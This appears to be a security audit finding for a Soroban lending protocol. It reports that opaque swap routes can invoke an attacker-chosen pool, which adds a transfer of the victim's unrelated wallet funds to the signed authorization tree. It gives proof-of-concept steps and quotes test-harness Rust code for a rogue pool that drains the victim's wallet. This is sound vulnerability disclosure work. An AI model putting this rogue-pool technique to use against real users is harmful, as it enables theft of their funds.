### Title
Arbitrary route venue invocation can steal unrelated caller wallet funds - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` accept opaque route bytes and pass them to the configured router. The controller authorizes only the expected input-token transfer, but the router interprets a pool address supplied inside that payload and invokes venue-specific code on it. Because the victim's root authorization covers the whole controller invocation, a malicious pool can add an unrelated `token.transfer(victim, attacker, amount)` child invocation to the authorization tree and steal assets never supplied to the lending protocol if the victim signs the simulated tree. [1](#0-0) [2](#0-1) 

### Finding Description
`process_swap_collateral` authenticates the caller, authorizes the account owner or delegate, and sends the caller-controlled `swap` bytes to `withdraw_and_swap_from_supply`. [3](#0-2) 

`process_swap_debt` follows the same pattern: it authenticates the account authority, borrows into the controller, and forwards the unmodified `swap` payload to `swap_tokens_or_passthrough`. [4](#0-3) 

The shared `swap_tokens` wrapper treats `swap` as opaque input, authorizes only one transfer of `token_in` to the configured router, invokes `router.execute_strategy`, and then checks only controller input/output balance deltas. [5](#0-4) [6](#0-5) 

Inside the router, a swap instruction constructs `SwapHop` from payload-controlled `assets` indices, so `pool`, `token_in`, and `token_out` are all route-controlled addresses. [7](#0-6) 

`dispatch_hop` then dispatches that route-selected pool to a venue adapter; it validates measured token movement around the call but does not confine the called contract to a known pool implementation. [8](#0-7) [9](#0-8) 

The Soroban authorization model makes this materially different from an ordinary bad-swap route: code reached below the victim's authenticated controller call can request another token transfer from the victim, and simulation records it as a child of the victim's authorization. The repository's exploit harness demonstrates a rogue pool performing `token.transfer(victim, attacker, amount)` and the resulting authorization tree containing that theft under `swap_collateral`. [10](#0-9) [11](#0-10) 

The demonstrated transaction leaves the protocol output and risk checks successful while Alice's unrelated wallet token balance drops from `77_770_000_000` to zero and the attacker receives the full amount. [12](#0-11) 

### Impact Explanation
This is theft of user funds beyond the position collateral or swap input. A malicious route can drain any token balance that the victim can transfer, while the protocol's measured output check and account solvency check remain satisfied. [6](#0-5) [13](#0-12) 

The loss is not bounded by the controller's exact input authorization because that authorization protects only the controller's own token grant, not unrelated child transfers requested from the user's authorization identity. [1](#0-0) [14](#0-13) 

### Likelihood Explanation
An unprivileged attacker can deploy the malicious venue and deliver the poisoned `swap` payload through any route-generation or quoting path used by the victim. The victim must invoke a route-bearing strategy and sign the resulting authorization tree, so exploitation depends on the victim accepting opaque route bytes and not inspecting the simulated child invocations. [15](#0-14) 

The affected operation is a normal reachable path rather than a privileged or upgrade path: `swap_collateral` only requires the account owner or an active delegate, and the same shared router call is used by the other account strategies. [16](#0-15) [17](#0-16) 

The severity is best assessed as **Medium**: the impact can be total loss of unrelated wallet assets, but exploitation requires victim submission/signing of a malicious route and authorization tree rather than allowing the attacker to invoke the strategy against an arbitrary account. [18](#0-17) 

### Recommendation
Do not treat `swap` as safe merely because its endpoints and measured output are checked. Constrain route pool addresses to governance-registered venue contracts, or execute routes through an isolated authorization boundary that cannot introduce additional child invocations under the user's auth identity. [1](#0-0) [2](#0-1) 

If arbitrary third-party venues must remain supported, the transaction-building path should be hardened so a route is rejected whenever simulation produces any child invocation other than the exact expected input transfer, and that requirement should be enforced before signing. [15](#0-14) 

### Proof of Concept
1. Deploy `RoguePool` with a `swap()` method that calls `token.transfer(victim, attacker, WALLET_BALANCE)`. The exploit fixture uses exactly this logic and shows that no routed token is required for the theft leg. [10](#0-9) 
2. Give the victim a debt-free account containing collateral and an unrelated wallet-token balance. [19](#0-18) 
3. Encode a route whose `pool` is `RoguePool`, while its input/output legs still deliver enough output for the strategy to pass its measured receipt and final risk checks. [20](#0-19) 
4. Have the victim invoke `swap_collateral(caller=victim, account_id, current=USDC-market, amount, new=ETH-market, swap=poisoned_route)`. [21](#0-20) 
5. Simulation records `RoguePool`'s unrelated wallet transfer as a child of the victim's `swap_collateral` authorization, and signing that tree executes the theft. [11](#0-10) [22](#0-21) 
6. The victim ends with zero units of the unrelated wallet token, the attacker receives `77_770_000_000`, and the victim's expected ETH collateral is still credited. [23](#0-22)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L21-38)
```rust
    require_positive_amount(env, amount_in);
    assert_with_error!(env, !swap.is_empty(), GenericError::InvalidPayments);

    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L152-165)
```rust
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L37-72)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(
        env,
        existing_debt != new_debt,
        GenericError::AssetsAreTheSame
    );
    config::require_hub_active(env, existing_debt.hub_id);
    require_positive_amount(env, new_debt_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    let existing_pos = get_debt_position_or_panic(env, &account, existing_debt);

    let extra_assets = vec![env, existing_debt.asset.clone(), new_debt.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let amount_received = borrow_into_controller(
        env,
        &mut account,
        new_debt,
        new_debt_amount,
        true,
        PositionAction::SwDebtR,
        &mut cache,
    );

    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L30-40)
```rust
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L50-56)
```rust
    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L84-100)
```rust
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L134-157)
```rust
    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L206-211)
```rust
    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L214-226)
```rust
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** contracts/controller/src/strategies/mod.rs (L48-55)
```rust
pub(crate) fn strategy_finalize(
    env: &Env,
    account_id: u64,
    account: &mut Account,
    cache: &mut Context,
) {
    let _ = enforce_post_pool_solvency(env, cache, account);
    finalize_position_flow(env, account_id, account, cache, PositionSides::Both, true);
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
